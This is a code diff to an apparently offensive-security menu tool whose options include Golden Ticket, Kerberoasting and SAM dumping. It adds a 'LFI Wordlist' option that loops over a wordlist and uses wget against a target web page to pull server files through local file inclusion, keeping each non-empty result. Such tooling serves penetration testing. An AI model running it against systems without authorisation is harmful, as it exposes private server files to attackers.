@@ -747,14 +747,14 @@ def dispMenu():
    return
    
 def options():
-   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Gold Ticket (71) ServScanner (81)             (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DNS    (500) WordPress Scan (600) LFI    Checker (   )           (    )          " + '\u2551')
+   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Gold Ticket (71) ServScanner (81)             (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DNS    (500) WordPress Scan (600) LFI OS Checker (   )           (    )          " + '\u2551')
    
    print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set FILE NAME (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Gold DC PAC (72) VulnScanner (82)", end= ' ')
    if proxyChains == 1:
       print(colored(menuName,colour0, attrs=['blink']), end= ' ')
    else:
       print(menuName, end= ' ')    
-   print("(92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Dig DNS      (501) WP Plugin Scan (   )		(   )		(    )          " + '\u2551')   
+   print("(92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Dig DNS      (501) WP Plugin Scan (601) LFI   Wordlist (   )		(    )          " + '\u2551')   
    
    print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set SHARENAME (33) Services (43) Sam Dump Users (53) KerberosBrute (63) Domain Dump (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Enum DOMAIN  (502)                (   )		(   )		(    )		" + '\u2551')   
    print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Set ALT  SERV (34) AT  Exec (44) REGistry Hives (54) KerbeRoasting (64) Blood Hound (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Recon DOMAIN (503)                (   )		(   )		(    )		" + '\u2551')
@@ -1646,7 +1646,8 @@ while True:
       print("\t/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt")
       print("\t/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt")
       print("\t/usr/share/seclists/Discovery/Web-Content/common.txt")   
-      print("\t./ROGUEAGENT/passwords.txt\n")      
+      print("\t./ROGUEAGENT/passwords.txt")      
+      print("\t./TREADSTONE/apache.txt\n")
       BAK = currentWordlist
       currentWordlist = input("[?] Please enter a new word list: ")      
       if currentWordlist != "":
@@ -1655,6 +1656,9 @@ while True:
          print("[+]  Password list succesfully changed...")
       if len(currentWordlist) < COL1:
          currentWordlist = spacePadding(currentWordlist, COL1)
+         
+         
+      #CHECK EXSITS AT SOME STAGE!
       prompt()      
                   
 # ------------------------------------------------------------------------------------- 
@@ -4169,9 +4173,39 @@ while True:
                   else:
                      print ("[!] Found file " + WEB + line.rstrip("\n") + "...")
                print("[+] Completed...")
-            remoteCOM("cd ..")
          else:
             print("[-] Unknown operating system...")          
+         remoteCOM("cd ..")
+      prompt()   
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - LFI CHECK
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '601':
+      checkParams = test_WEB()
+      os.chdir(workDir)
+      if checkParams != 1:
+         print(colored("[*] Using webpage LFI to enumerate files...", colour3))   
+         file1 = open("." + currentWordlist.rstrip(" "), 'r')
+         Lines = file1.readlines()
+         for line in Lines:
+            file = line.replace("/","-")
+            file = file.replace("\\","-")
+            file = file.replace(" ","_")
+            file = file.rstrip("\n")
+            ffile = "file" + file
+            remoteCOM("wget -q -O " + ffile + " " + WEB + line)
+            if os.stat(ffile).st_size == 0:
+               remoteCOM("rm " + ffile)
+            else:
+               print ("[!] Found file " + WEB + line.rstrip("\n") + "...")
+         print("[+] Completed...")   
+         remoteCOM("cd ..")
       prompt()   
 
 # ------------------------------------------------------------------------------------- 
